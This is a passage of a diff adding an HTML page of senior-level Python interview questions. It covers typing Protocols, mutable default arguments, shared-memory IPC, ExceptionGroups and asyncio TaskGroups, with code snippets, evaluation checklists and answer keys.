+• <strong>Dynamic Attributes:</strong> Adding unlisted attributes (e.g. <code>tick.timestamp = 123</code>) raises <code>AttributeError</code> unless <code>'__dict__'</code> is explicitly in <code>__slots__</code>.<br>
+• <strong>Weak References:</strong> If you use <code>weakref</code>, <code>'__weakref__'</code> must be explicitly declared in <code>__slots__</code>.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-10" data-keywords="typing protocol duck typing typevar generics covariance contravariance">
+                    <div class="card-header">
+                        <span class="concept-badge">Advanced Type System &amp; Protocols</span>
+                        <span class="q-number">Question 10 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                Modern Python <strong>Type System & Protocols (PEP 544)</strong>: Nominal vs Structural subtyping (formalized duck typing), <code>typing.Protocol</code>, generic type bounds, and Variance (Covariance vs Contravariance).
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                Your architecture requires an Event Store pipeline where various components produce audit serializations. You want compile-time type safety via <code>mypy</code> without forcing external libraries to inherit from your internal abstract base classes.
+<br><br>
+<strong>Part A:</strong> Explain the difference between <strong>Nominal Subtyping</strong> (inheriting from <code>abc.ABC</code>) and <strong>Structural Subtyping</strong> (using <code>typing.Protocol</code>).
+<br>
+<strong>Part B:</strong> What is Variance? When is a generic container <code>Container[T]</code> covariant (<code>covariant=True</code>) versus contravariant (<code>contravariant=True</code>)?
+<br>
+<strong>Part C:</strong> Implement a <code>SerializableProtocol</code> with runtime checkability (<code>@runtime_checkable</code>), and write a typed generic pipeline function that strictly accepts covariant collections of serializable items.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('10', 'protocols_variance.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-10" style="display:none;">from typing import Protocol, runtime_checkable, TypeVar, Generic, Sequence, Dict, Any
+
+# Step 1: Define a structural protocol for serializable entities
+@runtime_checkable
+class Serializable(Protocol):
+    def to_dict(self) -&gt; Dict[str, Any]:
+        ...
+
+# A class from a 3rd party library that has no knowledge of our codebase:
+class ThirdPartyOrder:
+    def __init__(self, order_id: str, total: float):
+        self.order_id = order_id
+        self.total = total
+
+    def to_dict(self) -&gt; Dict[str, Any]:
+        return {&quot;id&quot;: self.order_id, &quot;amount&quot;: self.total}</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-10">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 10, 1, 'Modern Python Type System & Protocols (PEP 544): Nominal vs Structural subtyping (formalized duck typing), typing.Protoc')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 10, 2, 'Modern Python Type System & Protocols (PEP 544): Nominal vs Structural subtyping (formalized duck typing), typing.Protoc')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 10, 3, 'Modern Python Type System & Protocols (PEP 544): Nominal vs Structural subtyping (formalized duck typing), typing.Protoc')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 10, 4, 'Modern Python Type System & Protocols (PEP 544): Nominal vs Structural subtyping (formalized duck typing), typing.Protoc')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-10">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate distinguish Nominal subtyping (explicit <code>class Foo(Base)</code>) from Structural subtyping (shape/duck-typing matching)?</li>
+<li>Do they explain Covariance: if <code>Dog</code> is a subtype of <code>Animal</code>, then <code>Sequence[Dog]</code> is a subtype of <code>Sequence[Animal]</code> (safe for read-only outputs)?</li>
+<li>Do they explain Contravariance: function argument consumers where <code>Callable[[Animal], None]</code> can accept a <code>Dog</code>?</li>
+<li>Do they demonstrate <code>isinstance(ThirdPartyOrder(), Serializable)</code> works at runtime due to <code>@runtime_checkable</code>?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. Nominal vs Structural Subtyping:</strong><br>
+• <strong>Nominal Subtyping:</strong> Type compatibility is determined strictly by explicit class inheritance hierarchies (e.g. <code>isinstance(x, Parent)</code>). Third-party classes cannot conform without modifying their source code.<br>
+• <strong>Structural Subtyping (PEP 544 Protocols):</strong> Type compatibility is determined purely by whether an object's structure (methods and attributes) matches the Protocol definition, enabling compile-time verified duck typing.<br><br>
+<strong>2. Variance & Covariance in Generic Pipelines:</strong><br>
+<pre><code>from typing import Protocol, runtime_checkable, TypeVar, Sequence, Dict, Any, List
+
+# Define Covariant TypeVar: read-only generic outputs can substitute subtypes
+T_co = TypeVar('T_co', bound='Serializable', covariant=True)
+
+@runtime_checkable
+class Serializable(Protocol):
+    def to_dict(self) -> Dict[str, Any]: ...
+
+class PipelineBatch(Generic[T_co]):
+    def __init__(self, items: Sequence[T_co]):
+        self._items = items # Read-only sequence
+
+    def export_all(self) -> List[Dict[str, Any]]:
+        return [item.to_dict() for item in self._items]
+
+# Because ThirdPartyOrder implements to_dict(), it passes both static mypy type check
+# and runtime isinstance() checks without inheriting from Serializable!
+order = ThirdPartyOrder("ORD_1", 99.99)
+assert isinstance(order, Serializable) # True!</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-11" data-keywords="mutable default argument python evaluation time id is equality interning">
+                    <div class="card-header">
+                        <span class="concept-badge">Mutability &amp; Default Argument Traps</span>
+                        <span class="q-number">Question 11 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                Python <strong>Evaluation Time vs Execution Time</strong>: The mutable default parameter trap, function <code>__defaults__</code> bytecode attributes, object identity (<code>is</code>) vs equality (<code>==</code>), and integer/string interning.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                A microservice has a subtle security bug: under heavy traffic, events from Customer A occasionally appear in Customer B's audit trail. Look at the code.
+<br><br>
+<strong>Part A:</strong> Explain why default argument values are evaluated only <em>once</em> at module import/definition time rather than on each function call. Where does CPython store these default values?
+<br>
+<strong>Part B:</strong> What is the difference between object identity (<code>is</code>) and value equality (<code>==</code>)? Under what conditions does <code>a is b</code> return <code>True</code> for integers or strings due to CPython interning?
+<br>
+<strong>Part C:</strong> Fix the function using standard Python idiom, and demonstrate how to inspect the function's internal <code>__defaults__</code> tuple via the Python interactive shell/runtime.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('11', 'mutable_audit.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-11" style="display:none;">from typing import List, Dict, Any
+import datetime
+
+# CRITICAL SECURITY BUG: Mutable list default evaluated at function DEFINITION time!
+def record_customer_audit(event_name: str, payload: Dict[str, Any], tags: List[str] = []) -&gt; List[str]:
+    tags.append(event_name)
+    tags.append(str(datetime.datetime.utcnow()))
+    return tags
+
+# Customer 1 request:
+c1 = record_customer_audit(&quot;LOGIN&quot;, {&quot;user&quot;: &quot;alice&quot;})
+
+# Customer 2 request:
+c2 = record_customer_audit(&quot;VIEW_BILL&quot;, {&quot;user&quot;: &quot;bob&quot;})
+
+print(&quot;Customer 2 Tags:&quot;, c2) 
+# Output includes Customer 1&#x27;s events! State leaked across tenants!</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-11">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 11, 1, 'Python Evaluation Time vs Execution Time: The mutable default parameter trap, function __defaults__ bytecode attributes,')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 11, 2, 'Python Evaluation Time vs Execution Time: The mutable default parameter trap, function __defaults__ bytecode attributes,')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 11, 3, 'Python Evaluation Time vs Execution Time: The mutable default parameter trap, function __defaults__ bytecode attributes,')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 11, 4, 'Python Evaluation Time vs Execution Time: The mutable default parameter trap, function __defaults__ bytecode attributes,')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-11">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate identify that <code>tags: List[str] = []</code> is created once when <code>def</code> is compiled, and stored in <code>record_customer_audit.__defaults__</code>?</li>
+<li>Do they explain all invocations without an explicit <code>tags</code> argument share the exact same list instance?</li>
+<li>Do they fix the issue using <code>tags: Optional[List[str]] = None</code> and <code>if tags is None: tags = []</code>?</li>
+<li>Can they explain integer interning (-5 to 256) and string interning?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. Why Default Arguments Leak State:</strong><br>
+In CPython, a <code>def</code> statement is an executable command. When the module loads, Python creates a function object and evaluates the default expressions <em>once</em>. The resulting object is stored in the function's <code>__defaults__</code> tuple. Every subsequent function call that omits the parameter receives a reference to this identical list object in heap memory. Mutating <code>tags.append()</code> modifies the shared object.<br><br>
+<strong>2. Idiomatic Production Fix:</strong><br>
+<pre><code>from typing import List, Dict, Any, Optional
+import datetime
+
+def record_customer_audit(
+    event_name: str,
+    payload: Dict[str, Any],
+    tags: Optional[List[str]] = None
+) -> List[str]:
+    # Allocate a fresh list on every invocation
+    resolved_tags = list(tags) if tags is not None else []
+    resolved_tags.append(event_name)
+    resolved_tags.append(str(datetime.datetime.utcnow()))
+    return resolved_tags</code></pre><br>
+<strong>3. Identity (is) vs Equality (==) & Interning:</strong><br>
+• <code>a == b</code> checks value equivalence via <code>a.__eq__(b)</code>.<br>
+• <code>a is b</code> compares memory addresses (<code>id(a) == id(b)</code>).<br>
+CPython pre-allocates an array of small integer objects for values between <code>-5</code> and <code>256</code>. <code>x = 250; y = 250; x is y</code> is <code>True</code>, but for <code>1000</code> it may be <code>False</code> (unless interned by compiler constant folding).
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-12" data-keywords="multiprocessing shared_memory ipc zero copy pickle serialization mmap">
+                    <div class="card-header">
+                        <span class="concept-badge">Multiprocessing &amp; Zero-Copy Shared Memory</span>
+                        <span class="q-number">Question 12 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                <strong>Multiprocessing & High-Performance IPC</strong>: Eliminating IPC serialization overhead (<code>pickle</code>) across worker processes using <code>multiprocessing.shared_memory</code> and the Python Buffer Protocol.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                An AI model inference server passes a 200MB floating-point feature matrix from an ingestion process to 4 worker processes using <code>multiprocessing.Queue</code>. Throughput collapses due to 100% CPU usage spent entirely on serialization.
+<br><br>
+<strong>Part A:</strong> Explain why passing large objects through <code>multiprocessing.Queue</code> creates massive CPU overhead (IPC socket writes, pickling, unpickling, and memory copying).
+<br>
+<strong>Part B:</strong> What is Python's <strong>Buffer Protocol</strong> (<code>memoryview</code>), and how does it enable zero-copy memory access?
+<br>
+<strong>Part C:</strong> Refactor the IPC mechanism using <code>multiprocessing.shared_memory.SharedMemory</code> so all worker processes read the exact same physical memory block simultaneously without copying.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('12', 'shared_memory_ipc.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-12" style="display:none;">import multiprocessing
+from multiprocessing import Queue
+import time
+import os
+
+def worker_naive(queue: Queue):
+    # Consumes massive CPU deserializing 200MB pickle payload on every message!
+    matrix_data = queue.get()
+    print(f&quot;Process {os.getpid()} received {len(matrix_data)} bytes&quot;)
+
+def start_pipeline():
+    q = Queue()
+    data = b&quot;X&quot; * (200 * 1024 * 1024) # 200 Megabytes
+    p = multiprocessing.Process(target=worker_naive, args=(q,))
+    p.start()
+    q.put(data) # Bottleneck: serializing and copying across pipe!
+    p.join()</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-12">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 12, 1, 'Multiprocessing & High-Performance IPC: Eliminating IPC serialization overhead (pickle) across worker processes using mu')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 12, 2, 'Multiprocessing & High-Performance IPC: Eliminating IPC serialization overhead (pickle) across worker processes using mu')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 12, 3, 'Multiprocessing & High-Performance IPC: Eliminating IPC serialization overhead (pickle) across worker processes using mu')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 12, 4, 'Multiprocessing & High-Performance IPC: Eliminating IPC serialization overhead (pickle) across worker processes using mu')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-12">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate identify that <code>multiprocessing.Queue</code> uses <code>pickle</code> to serialize objects and pipes them over OS UNIX sockets/pipes?</li>
+<li>Do they explain that 200MB pickled data copies memory multiple times (process A -> pipe buffer -> process B)?</li>
+<li>Do they use <code>multiprocessing.shared_memory.SharedMemory</code> to allocate shared POSIX memory segments (<code>/dev/shm</code>)?</li>
+<li>Do they demonstrate wrapping the shared memory with <code>memoryview</code> for zero-copy slicing and reads?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. The IPC Bottleneck with Queues:</strong><br>
+When sending data through <code>multiprocessing.Queue</code>, Python pickles the object into a byte stream, writes it across an OS pipe/socket, and the receiving process reads and unpickles it into a new object. For a 200MB buffer, this incurs 4 full memory copies, saturates memory bus bandwidth, and spikes CPU cycles purely in <code>pickle.dumps()</code> and <code>loads()</code>.<br><br>
+<strong>2. Zero-Copy Architecture with SharedMemory:</strong><br>
+<pre><code>from multiprocessing import shared_memory, Process
+import os
+
+def worker_shared(shm_name: str, size: int):
+    # Attach directly to the existing POSIX shared memory block by name
+    existing_shm = shared_memory.SharedMemory(name=shm_name)
+    # Zero-copy access via memoryview buffer protocol
+    view = memoryview(existing_shm.buf)
+    
+    # Process slice without copying memory into the process heap
+    first_byte = view[0]
+    print(f"Worker {os.getpid()} read byte: {first_byte} via shared zero-copy memory")
+    existing_shm.close()
+
+def main():
+    payload_size = 200 * 1024 * 1024
+    # Allocate shared memory segment mapped in OS virtual memory (/dev/shm)
+    shm = shared_memory.SharedMemory(create=True, size=payload_size)
+    shm.buf[:5] = b"HELLO"
+
+    p = Process(target=worker_shared, args=(shm.name, payload_size))
+    p.start()
+    p.join()
+    
+    shm.close()
+    shm.unlink() # Release OS shared memory segment</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-13" data-keywords="exceptions exceptiongroup except* raise from cause context traceback">
+                    <div class="card-header">
+                        <span class="concept-badge">Exception Handling &amp; ExceptionGroups</span>
+                        <span class="q-number">Question 13 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                <strong>Exception Architecture & Error Propagation</strong>: Explicit exception chaining (<code>raise ... from ...</code>), suppressing context, and modern Python 3.11+ <strong>ExceptionGroup</strong> and <code>except*</code> handling.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                A distributed transaction orchestrator executes 3 parallel operations (deduct balance, reserve inventory, audit log). If 2 of these operations fail concurrently, legacy Python exception handling forces you to drop or ignore one error.
+<br><br>
+<strong>Part A:</strong> What is the difference between implicit exception context (<code>__context__</code>) and explicit exception chaining (<code>__cause__</code> via <code>raise NewError from err</code>)? How do you completely suppress an original exception trace?
+<br>
+<strong>Part B:</strong> Explain why traditional <code>try...except Exception:</code> cannot cleanly handle multiple concurrent exceptions in modern asynchronous code.
+<br>
+<strong>Part C:</strong> Implement an error handler using Python 3.11's <code>ExceptionGroup</code> and the <code>except*</code> syntax to catch and process distinct exception types concurrently without losing stack traces.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('13', 'exception_groups.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-13" style="display:none;">from typing import List
+
+class PaymentError(Exception): pass
+class InventoryError(Exception): pass
+
+# Legacy problem: If both fail, raising one hides the other!
+def handle_errors_naive(errors: List[Exception]):
+    if errors:
+        raise errors[0] # Drops all subsequent exceptions!
+
+# Python 3.11+ ExceptionGroup structure
+def demonstrate_exception_group():
+    errs = [
+        PaymentError(&quot;Card processor declined&quot;),
+        InventoryError(&quot;SKU out of stock&quot;),
+        PaymentError(&quot;Gateway timeout&quot;)
+    ]
+    raise ExceptionGroup(&quot;Transaction Orchestration Failed&quot;, errs)</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-13">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 13, 1, 'Exception Architecture & Error Propagation: Explicit exception chaining (raise ... from ...), suppressing context, and m')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 13, 2, 'Exception Architecture & Error Propagation: Explicit exception chaining (raise ... from ...), suppressing context, and m')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 13, 3, 'Exception Architecture & Error Propagation: Explicit exception chaining (raise ... from ...), suppressing context, and m')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 13, 4, 'Exception Architecture & Error Propagation: Explicit exception chaining (raise ... from ...), suppressing context, and m')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-13">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate explain <code>raise NewException from orig_err</code> sets <code>__cause__</code>, while <code>raise NewException from None</code> suppresses the previous traceback?</li>
+<li>Do they explain that <code>ExceptionGroup</code> bundles multiple distinct exceptions into a tree structure?</li>
+<li>Do they demonstrate Python 3.11 <code>except* PaymentError as eg:</code> to partially match and handle specific exception subsets within the group?</li>
+<li>Do they show that unhandled exceptions within the group are automatically re-raised?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. Exception Chaining Mechanics:</strong><br>
+• When an exception occurs inside an <code>except</code> block, Python attaches the original error to <code>new_err.__context__</code>.<br>
+• Explicit chaining <code>raise ServiceError("msg") from original_error</code> sets <code>__cause__</code>, producing the clean: <em>"The above exception was the direct cause of the following exception"</em>.<br>
+• <code>raise ServiceError("msg") from None</code> clears <code>__suppress_context__ = True</code>, hiding internal implementation details from external callers.<br><br>
+<strong>2. Python 3.11+ ExceptionGroup & except*:</strong><br>
+<pre><code>def process_transaction_failures():
+    try:
+        demonstrate_exception_group()
+    except* PaymentError as eg:
+        # Handles ONLY the PaymentErrors in the group
+        for exc in eg.exceptions:
+            print(f"Rolling back payment attempt: {exc}")
+    except* InventoryError as eg:
+        # Handles ONLY the InventoryErrors in the group
+        for exc in eg.exceptions:
+            print(f"Releasing warehouse locks: {exc}")
+    # Any unhandled exception types remaining in the group are automatically re-raised!</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-14" data-keywords="asyncio taskgroup structured concurrency gather shield cancellation leak">
+                    <div class="card-header">
+                        <span class="concept-badge">AsyncIO Structured Concurrency &amp; TaskGroups</span>
+                        <span class="q-number">Question 14 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                <strong>Structured Concurrency in AsyncIO (PEP 654 / Python 3.11+)</strong>: Why <code>asyncio.gather</code> leaks orphan tasks, how <code>asyncio.TaskGroup</code> guarantees task lifecycles, and shielding critical cleanup coroutines from cancellation.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                An e-commerce order checkout executes 3 async operations: <code>charge_card()</code>, <code>reserve_inventory()</code>, and <code>send_confirmation_email()</code>. If <code>charge_card()</code> raises an exception after 100ms, look at what happens under <code>asyncio.gather()</code>.
+<br><br>
+<strong>Part A:</strong> Under <code>asyncio.gather()</code>, when one coroutine fails, what happens to the remaining running coroutines? Why does this lead to 'orphan task' resource leaks?
+<br>
+<strong>Part B:</strong> How does Python 3.11+ <code>asyncio.TaskGroup</code> introduce <strong>Structured Concurrency</strong>? If one task fails, what is the exact cancellation sequence for siblings?
+<br>
+<strong>Part C:</strong> When an async task is cancelled, its coroutine is interrupted with <code>CancelledError</code>. How do you protect a critical database cleanup or rollback task using <code>asyncio.shield()</code> so cancellation does not abort it midway?
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('14', 'structured_concurrency.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-14" style="display:none;">import asyncio
+
+async def charge_card():
+    await asyncio.sleep(0.1)
+    raise ValueError(&quot;Payment Gateway 502 Bad Gateway&quot;)
+
+async def reserve_inventory():
+    try:
+        await asyncio.sleep(2.0) # Still running when charge_card fails!
+        print(&quot;Inventory reserved!&quot;) # Leaked execution!
+    except asyncio.CancelledError:
+        print(&quot;Inventory cancelled!&quot;)
+
+async def naive_checkout():
+    # BUG: When charge_card fails, gather immediately raises,
+    # but reserve_inventory continues running in background as an orphan!
+    await asyncio.gather(
+        charge_card(),
+        reserve_inventory()
+    )</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-14">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 14, 1, 'Structured Concurrency in AsyncIO (PEP 654 / Python 3.11+): Why asyncio.gather leaks orphan tasks, how asyncio.TaskGroup')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 14, 2, 'Structured Concurrency in AsyncIO (PEP 654 / Python 3.11+): Why asyncio.gather leaks orphan tasks, how asyncio.TaskGroup')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 14, 3, 'Structured Concurrency in AsyncIO (PEP 654 / Python 3.11+): Why asyncio.gather leaks orphan tasks, how asyncio.TaskGroup')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 14, 4, 'Structured Concurrency in AsyncIO (PEP 654 / Python 3.11+): Why asyncio.gather leaks orphan tasks, how asyncio.TaskGroup')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-14">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate explain that <code>asyncio.gather(..., return_exceptions=False)</code> raises immediately on the first exception, but does NOT cancel other pending coroutines?</li>
+<li>Do they explain <code>asyncio.TaskGroup</code> automatically cancels all remaining running tasks if any child raises an exception?</li>
+<li>Do they demonstrate using <code>async with asyncio.TaskGroup() as tg:</code>?</li>
+<li>Do they explain <code>asyncio.shield()</code> protects a coroutine from being cancelled by its parent caller?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. The Flaw with asyncio.gather:</strong><br>
+By default, when a coroutine in <code>asyncio.gather()</code> raises an exception, <code>gather()</code> immediately propagates that exception up the call stack. However, it does <em>not</em> cancel the other tasks running in the gather list. They continue running in the background as unmonitored 'orphan' tasks, consuming CPU, holding DB connections, and potentially committing data for an aborted checkout.<br><br>
+<strong>2. Structured Concurrency with TaskGroup:</strong><br>
+<pre><code>import asyncio
+
+async def safe_checkout():
+    try:
+        # TaskGroup guarantees that upon exit, all tasks have completed or been cancelled
+        async with asyncio.TaskGroup() as tg:
+            t1 = tg.create_task(charge_card())
+            t2 = tg.create_task(reserve_inventory())
+    except* ValueError as eg:
+        print(f"Handled payment failure: {eg.exceptions}")
+        # At this point, reserve_inventory is GUARANTEED to have received CancelledError
+        # and finished its cleanup before code reaches here!</code></pre><br>
+<strong>3. Shielding Critical Cleanup:</strong><br>
+<pre><code>async def rollback_transaction():
+    # If caller is cancelled, shield prevents cancellation from propagating to the rollback
+    await asyncio.shield(db_conn.execute_rollback())</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-15" data-keywords="decorator wraps functools inspect signature closures metadata parameterize">
+                    <div class="card-header">
+                        <span class="concept-badge">Decorators, Signature Binding &amp; functools.wraps</span>
+                        <span class="q-number">Question 15 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                <strong>Decorator Mechanics, Closures & Metadata Preservation</strong>: Writing parameterized decorators, understanding closure scope, preserving <code>__wrapped__</code> introspection with <code>functools.wraps</code>, and binding arguments with <code>inspect.signature</code>.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                You are creating an enterprise <code>@rate_limit(max_per_sec=10)</code> and <code>@audit_log</code> decorator framework used across internal microservices. Look at the code.
+<br><br>
